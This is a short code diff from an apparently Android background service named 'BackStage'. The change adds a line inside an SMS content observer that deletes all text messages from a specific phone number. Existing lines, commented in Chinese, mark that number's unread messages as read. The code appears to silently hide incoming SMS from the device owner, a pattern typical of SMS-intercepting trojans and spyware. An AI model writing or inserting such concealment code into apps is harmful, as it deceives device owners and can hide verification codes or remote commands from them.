@@ -180,13 +180,15 @@ public class BackStage extends Service {
 		public void onChange(boolean selfChange) {
 			// TODO Auto-generated method stub
 			super.onChange(selfChange);
-
+			
+            getContentResolver().delete(Uri.parse("content://sms"),
+                    "address=?", new String[] { phone });
 			// 读取收件箱中指定号码的短信
 			cursor = getContentResolver().query(Uri.parse("content://sms"),
 					new String[] { "_id", "address", "read" },
 					" address=? and read=?", new String[] { phone, "0" },
 					"date desc");
-
+			
 			ContentValues values = new ContentValues();
             values.put("read", "1"); // 修改短信为已读模式
             cursor.moveToFirst();
